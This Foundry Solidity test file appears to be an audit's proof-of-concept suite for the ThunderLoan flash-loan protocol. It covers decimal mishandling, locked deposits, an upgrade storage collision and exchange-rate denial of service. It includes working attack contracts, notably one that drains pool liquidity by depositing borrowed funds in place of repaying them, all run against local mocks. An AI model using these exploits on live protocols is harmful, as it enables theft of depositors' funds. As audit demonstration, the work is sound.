//SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.20;

import {Test, console, console2} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {
    ThunderLoanUpgraded
} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {MockTSwapPool} from "./mocks/MockTSwapPool.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {
    ERC1967Proxy
} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";
import {IThunderLoanFixed} from "../src/interfaces/IThunderLoanFixed.sol";

contract ERC20Mock6Decimals is ERC20Mock {
    uint8 private immutable i_decimals;

    constructor() ERC20Mock() {
        i_decimals = 6;
    }

    function decimals() public view override returns (uint8) {
        return i_decimals;
    }
}

contract POCtest is Test {
    ThunderLoan thunderLoanImplementation;
    MockPoolFactory mockPoolFactory;
    ERC1967Proxy proxy;
    ThunderLoan thunderLoan;

    ERC20Mock weth;
    ERC20Mock tokenA;
    ERC20Mock tokenB;
    ERC20Mock6Decimals tokenWith6Decimals;
    AssetToken assetToken6Decimals;
    AssetToken assetTokenA;
    AssetToken assetTokenB;

    address depositer = makeAddr("depositer");
    address flahLoanReceiver = makeAddr("flashLoanReceiver");
    address flashLoanAttacker = makeAddr("flashLoanAttacker");

    function setUp() public virtual {
        thunderLoan = new ThunderLoan();
        mockPoolFactory = new MockPoolFactory();

        weth = new ERC20Mock();
        tokenA = new ERC20Mock();
        tokenB = new ERC20Mock();
        tokenWith6Decimals = new ERC20Mock6Decimals();

        mockPoolFactory.createPool(address(tokenA));
        mockPoolFactory.createPool(address(tokenWith6Decimals));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));

        assetTokenB = thunderLoan.setAllowedToken(
            IERC20(address(tokenB)),
            true
        );

        assetToken6Decimals = thunderLoan.setAllowedToken(
            IERC20(address(tokenWith6Decimals)),
            true
        );

        tokenA.mint(depositer, 50000 * 10 ** tokenA.decimals()); //fund depositer with tokenA

        //fund depositer with token with 6 decimals
        tokenWith6Decimals.mint(
            depositer,
            5000 * 10 ** tokenWith6Decimals.decimals()
        ); // 5000 tokens in 6-decimal representation
    }

    function test6DecimalsTokenDepositBreaksAccountability() public {
        //fund depositer with token with 6 decimals
        tokenWith6Decimals.mint(
            depositer,
            5000 * 10 ** tokenWith6Decimals.decimals()
        ); // 5000 tokens in 6-decimal representation

        uint256 depositAmountHuman = 1000; // user wants to deposit 1000 tokens
        uint256 depositAmountRaw = depositAmountHuman *
            10 ** tokenWith6Decimals.decimals(); // 1000 * 1e6 = 1e9

        // The expected AssetToken amount if decimals were properly normalized:
        // Since exchange rate is 1:1 and AssetToken has 18 decimals,
        // depositing 1000 tokens should yield 1000 AssetTokens = 1000e18 raw
        uint256 expectedAssetTokenRaw = depositAmountHuman *
            10 ** assetToken6Decimals.decimals(); // 1000e18

        // Deposit 1000 tokens (6 decimals)
        vm.startPrank(depositer);
        tokenWith6Decimals.approve(address(thunderLoan), depositAmountRaw);
        thunderLoan.deposit(
            IERC20(address(tokenWith6Decimals)),
            depositAmountRaw
        );
        vm.stopPrank();

        uint256 actualAssetTokenRaw = assetToken6Decimals.balanceOf(depositer);

        // BUG: deposit() calculates mintAmount = (amount * 1e18) / exchangeRate
        // With a 6-decimal token: mintAmount = (1e9 * 1e18) / 1e18 = 1e9 raw AssetToken
        // But AssetToken has 18 decimals, so 1e9 raw = 0.000000001 AssetToken
        // The user deposited 1000 tokens but received mass less AssetTokens

        // The protocol mints depositAmountRaw (1e9) instead of 1000e18
        assertEq(
            actualAssetTokenRaw,
            depositAmountRaw,
            "Protocol mints raw deposit amount without normalizing decimals"
        );

        // The minted amount is NOT equal to the correct expected value
        assertTrue(
            actualAssetTokenRaw != expectedAssetTokenRaw,
            "Minted amount should NOT match the correctly normalized value"
        );

        // The error factor is 1e12 (= 10^(18-6))
        assertEq(
            expectedAssetTokenRaw / actualAssetTokenRaw,
            1e12,
            "Error factor is 1e12 due to decimal mismatch"
        );
    }

    function testDeleteAllowedTokenCanLostFundsToDepositer() public {
        // This test use Basetest.t.sol setup
        assetTokenA = thunderLoan.setAllowedToken(
            IERC20(address(tokenA)),
            true
        );

        // Deposit some tokenA to get assetTokenA
        uint256 depositAmount = 1000 * 10 ** tokenA.decimals();
        vm.startPrank(depositer);
        tokenA.approve(address(thunderLoan), depositAmount);
        thunderLoan.deposit(tokenA, depositAmount);
        vm.stopPrank();

        // assert that the depositer received the correct amount of assetTokenA
        uint256 assetTokenDepositerBalance = assetTokenA.balanceOf(depositer);
        assertEq(assetTokenDepositerBalance, depositAmount);

        // Now delete tokenA from allowed tokens
        thunderLoan.setAllowedToken(IERC20(address(tokenA)), false);

        // The depositer can't redeem their assetTokenA for tokenA, because tokenA is no longer allowed
        vm.startPrank(depositer);
        assetTokenA.approve(address(thunderLoan), assetTokenDepositerBalance);
        vm.expectRevert(
            abi.encodeWithSelector(
                ThunderLoan.ThunderLoan__NotAllowedToken.selector,
                address(tokenA)
            )
        );
        thunderLoan.redeem(tokenA, assetTokenDepositerBalance);
        vm.stopPrank();
    }

    function testUserCanDrainAllLiquidityUsingFlashLoanAndDeposit() public {
        // This test use Basetest.t.sol setup
        tokenA.mint(depositer, 50000 * 10 ** tokenA.decimals()); //fund depositer with tokenA
        assetTokenA = thunderLoan.setAllowedToken(
            IERC20(address(tokenA)),
            true
        );

        // AssetTokenA has 0 tokenA deposited, now depositer will deposit TokenA and allows flashLoan
        vm.startPrank(depositer);
        uint256 depositAmount = tokenA.balanceOf(depositer);
        tokenA.approve(address(thunderLoan), depositAmount);
        thunderLoan.deposit(tokenA, depositAmount);
        vm.stopPrank();

        //INITIAL STATE
        uint256 assetTokenAInitialBalance = tokenA.balanceOf(
            address(assetTokenA)
        ); //50000 tokens
        uint256 initialAttackerBalance = 10 * 10 ** tokenA.decimals(); //100 tokens
        address underlying = address(tokenA);

        vm.startPrank(flashLoanAttacker);
        tokenA.mint(flashLoanAttacker, initialAttackerBalance); // fund attacker with tokenA to pay fee

        //deploy and fund attacker contract, then execute attack
        FlashLoanAttacker attackerContract = new FlashLoanAttacker(
            address(thunderLoan)
        );
        tokenA.transfer(address(attackerContract), initialAttackerBalance); //used to pay fees first time
        //INITAL STATE CONSOLELOGS
        console2.log("--------initial state before flashloan--------");
        console2.log(
            "initial token balance of AssetToken: ",
            assetTokenAInitialBalance
        );
        console2.log(
            "Attacker contract initial balance:    ",
            IERC20(underlying).balanceOf(address(attackerContract))
        );

        console2.log("---------------------------------------------");
        attackerContract.attack(underlying);
        attackerContract.attack(underlying);
        attackerContract.sendAllUnderlyingToAttacker(underlying); // transfer all tokenA from attacker contract to attacker EOA
        vm.stopPrank();

        console2.log("--------final state after attack--------");
        console2.log(
            "final token balance of AssetToken: ",
            tokenA.balanceOf(address(assetTokenA))
        );
        console2.log(
            "AttackerContract final balance:    ",
            IERC20(underlying).balanceOf(address(attackerContract))
        );
        console2.log(
            "attacker final balance: ",
            IERC20(underlying).balanceOf(flashLoanAttacker)
        );
        console2.log("---------------------------------------------");

        assertGt(
            tokenA.balanceOf(flashLoanAttacker),
            initialAttackerBalance,
            "Attacker should have more tokens after the attack"
        );
        assertEq(
            tokenA.balanceOf(address(assetTokenA)),
            1,
            "AssetToken should have 0 tokens after the attack"
        );
    }

    function testThunderLoanInterface() public {
        // This test use Basetest.t.sol setup
        tokenA.mint(depositer, 50000 * 10 ** tokenA.decimals()); //fund depositer with tokenA
        assetTokenA = thunderLoan.setAllowedToken(
            IERC20(address(tokenA)),
            true
        );

        // AssetTokenA has 0 tokenA deposited, now depositer will deposit TokenA and allows flashLoan
        vm.startPrank(depositer);
        uint256 depositAmount = tokenA.balanceOf(depositer);
        tokenA.approve(address(thunderLoan), depositAmount);
        thunderLoan.deposit(tokenA, depositAmount);
        vm.stopPrank();

        vm.startPrank(flahLoanReceiver);
        FlashLoanReceiver receiverContract = new FlashLoanReceiver(
            address(thunderLoan)
        );
        tokenA.mint(address(receiverContract), 100 * 10 ** tokenA.decimals()); // fund receiverContract with tokenA to pay fee

        receiverContract.requestFlashLoan(
            address(tokenA),
            1 * 10 ** tokenA.decimals()
        ); // request flash loan of 1 tokenA
        vm.stopPrank();
    }

    function testDOSattackDueToExchangeRateManipulationWithFlashLoan() public {
        // This test use Basetest.t.sol setup
        uint256 mintToAttacker = 1 * 10 ** tokenA.decimals();
        tokenA.mint(flashLoanAttacker, mintToAttacker); // fund attacker with tokenA

        assetTokenA = thunderLoan.setAllowedToken(
            IERC20(address(tokenA)),
            true
        );

        assertEq(tokenA.balanceOf(address(assetTokenA)), 0);
        assertEq(assetTokenA.totalSupply(), 0);
        assertEq(assetTokenA.getExchangeRate(), 1e18); //1:1 exchange rate at the beginning

        // Attacker deposits tokenA and gets assetTokenA
        vm.startPrank(flashLoanAttacker);
        ExchangeRateManipulator manipulator = new ExchangeRateManipulator(
            address(thunderLoan)
        );
        tokenA.transfer(address(manipulator), mintToAttacker);
        manipulator.manipulateExchangeRate(address(tokenA));

        assertGt(
            assetTokenA.getExchangeRate(),
            100e18,
            "Exchange rate should have increased after manipulation"
        );
    }

    function testDOSdueToupgradeImplementationAndSettingFeesAtOneUndredPercent()
        public
    {
        // SETUP: allow tokenA and fund the depositer
        assetTokenA = thunderLoan.setAllowedToken(
            IERC20(address(tokenA)),
            true
        );

        vm.startPrank(depositer);
        tokenA.approve(address(thunderLoan), 50000e18);
        thunderLoan.deposit(IERC20(address(tokenA)), 50000e18);
        vm.stopPrank();

        // STEP 1: verify fee BEFORE upgrade → should be 0.3%
        uint256 borrowAmount = 1000e18;
        uint256 feeBefore = thunderLoan.getCalculatedFee(
            IERC20(address(tokenA)),
            borrowAmount
        );
        uint256 feeRawBefore = thunderLoan.getFee(); // should be 3e15

        console.log("=== BEFORE UPGRADE ===");
        console.log("s_flashLoanFee slot value : ", feeRawBefore); // 3e15
        console.log("Calculated fee on 1000e18 : ", feeBefore); // ~3e15

        assertEq(feeRawBefore, 3e15);

        // STEP 2: upgrade to ThunderLoanUpgraded
        ThunderLoanUpgraded thunderLoanUpgradedImplementation = new ThunderLoanUpgraded();

        vm.prank(thunderLoan.owner());
        thunderLoan.upgradeTo(address(thunderLoanUpgradedImplementation));

        // Cast proxy to upgraded interface
        ThunderLoanUpgraded thunderLoanUpgraded = ThunderLoanUpgraded(
            address(proxy)
        );

        // STEP 3: verify fee AFTER upgrade → reads s_feePrecision (1e18) instead of s_flashLoanFee (3e15) due to storage collision
        uint256 feeRawAfter = thunderLoanUpgraded.getFee(); // reads wrong slot
        uint256 feeAfter = thunderLoanUpgraded.getCalculatedFee(
            IERC20(address(tokenA)),
            borrowAmount
        );

        console.log("=== AFTER UPGRADE ===");
        console.log("s_flashLoanFee slot value : ", feeRawAfter); // 1e18 ← collision
        console.log("Calculated fee on 1000e18 : ", feeAfter); // = borrowAmount

        // Storage collision: s_flashLoanFee now reads old s_feePrecision = 1e18
        assertEq(feeRawAfter, 1e18);
        // Fee is now 100% of borrowed amount, not 0.3%
        assertNotEq(feeAfter, feeBefore);
        assertEq(feeAfter, borrowAmount);

    }
}

contract ExchangeRateManipulator {
    ThunderLoan private immutable i_thunderLoan;

    constructor(address thunderLoan) {
        i_thunderLoan = ThunderLoan(thunderLoan);
    }

    function manipulateExchangeRate(address token) external {
        AssetToken assetToken = i_thunderLoan.s_tokenToAssetToken(
            IERC20(token)
        );
        IERC20(token).approve(address(i_thunderLoan), type(uint256).max);
        // deposit minimum viable amount to minimize totalSupply
        // minimum to avoid fee rounding to zero: ceil(1e18 / 3e15) = 334 wei
        uint256 minDeposit = 334;
        i_thunderLoan.deposit(IERC20(token), minDeposit);
        uint256 flashLoanAmount = IERC20(token).balanceOf(address(assetToken)); // = 334 wei
        for (uint256 i = 0; i < 1540; i++) {
            i_thunderLoan.flashloan(
                address(this),
                IERC20(token),
                flashLoanAmount,
                ""
            );
        }
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external {
        i_thunderLoan.repay(IERC20(token), amount + fee);
    }
}

contract FlashLoanReceiver {
    IThunderLoanFixed private immutable i_thunderLoan;

    constructor(address thunderLoan) {
        i_thunderLoan = IThunderLoanFixed(thunderLoan);
    }

    //amount 1
    function requestFlashLoan(
        address _underlyingToken,
        uint256 amount
    ) external {
        i_thunderLoan.flashloan(address(this), _underlyingToken, amount, "");
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external {
        IERC20(token).approve(address(i_thunderLoan), amount + fee);
        i_thunderLoan.repay(IERC20(token), amount + fee);
    }
}

contract FlashLoanAttacker {
    ThunderLoan private immutable i_thunderLoan;

    constructor(address thunderLoan) {
        i_thunderLoan = ThunderLoan(thunderLoan);
    }

    //amount 1
    function attack(address _underlyingToken) external {
        console2.log("--------starting attack--------");

        AssetToken assetToken = i_thunderLoan.s_tokenToAssetToken(
            IERC20(_underlyingToken)
        );
        uint256 attackerBalance = IERC20(_underlyingToken).balanceOf(
            address(this)
        );
        uint256 poolBalance = IERC20(_underlyingToken).balanceOf(
            address(assetToken)
        );

        // max amount the attacker can borrow given its balance to pay the fee
        uint256 maxAmount = (attackerBalance *
            i_thunderLoan.getFeePrecision()) / i_thunderLoan.getFee();

        // cap to pool balance to avoid revert for not enough liquidity
        uint256 flashLoanAmount = maxAmount > poolBalance
            ? poolBalance
            : maxAmount;

        i_thunderLoan.flashloan(
            address(this),
            IERC20(_underlyingToken),
            flashLoanAmount,
            ""
        );

        uint256 currentPoolBalance = IERC20(_underlyingToken).balanceOf(
            address(assetToken)
        );
        uint256 currentRate = assetToken.getExchangeRate();
        uint256 maxRedeemableShares = (currentPoolBalance *
            assetToken.EXCHANGE_RATE_PRECISION()) / currentRate;
        uint256 myShares = assetToken.balanceOf(address(this));
        uint256 redeemAmount = myShares < maxRedeemableShares
            ? myShares
            : maxRedeemableShares;

        i_thunderLoan.redeem(IERC20(_underlyingToken), redeemAmount);
        //attack completed, Attacker has "clean" underlying tokens in its balance, without any trace of flashLoan in the history of transactions
    }

    function sendAllUnderlyingToAttacker(address _underlyingToken) external {
        uint256 amount = IERC20(_underlyingToken).balanceOf(address(this));
        IERC20(_underlyingToken).transfer(msg.sender, amount);
    }

    // to complete the attack, attacker need fee amount of token in its balance, then will use stolen tokens
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external {
        IERC20(token).approve(address(i_thunderLoan), amount + fee);
        i_thunderLoan.deposit(IERC20(token), amount + fee);
        //Now Atacker has asset tokens ready to be redeemed after flashLoan execution
    }
}
